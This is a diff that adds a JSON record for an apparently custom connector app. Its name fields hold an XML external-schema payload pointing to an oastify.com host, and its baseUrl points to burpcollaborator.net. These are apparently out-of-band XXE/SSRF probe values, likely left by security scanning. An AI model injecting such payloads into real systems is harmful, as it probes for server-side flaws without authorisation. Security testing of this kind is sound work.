@@ -1,0 +1,17 @@
+{
+	"baseUrl":"http://burpcollaborator.net/zgjZCdeP",
+	"createdTime":1741334782461,
+	"deleted":false,
+	"description":"qvaqcL",
+	"enabled":false,
+	"id":"67caa8feb8a3852f709fe3f2",
+	"lastModifiedBy":22743,
+	"lcName":"<hdq xmlns=\"http://a.b/\" xmlns:xsi=\"http://www.w3.org/2001/xmlschema-instance\" xsi:schemalocation=\"http://a.b/ http://wjj3mao3k6zwce9xvvox6iseu50yopfdf17oxcm.oastify.com/hdq.xsd\">hdq</hdq>",
+	"logo":"https://assets.unifyapps.com/images/app-icons/custom_connector_01.svg",
+	"modifiedTime":1741334782461,
+	"name":"<hdq xmlns=\"http://a.b/\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://a.b/ http://wjj3mao3k6zwce9xvvox6iseu50yopfdf17oxcm.oastify.com/hdq.xsd\">hdq</hdq>",
+	"ownerUserId":22743,
+	"standard":false,
+	"standardApp":false,
+	"version":0
+}
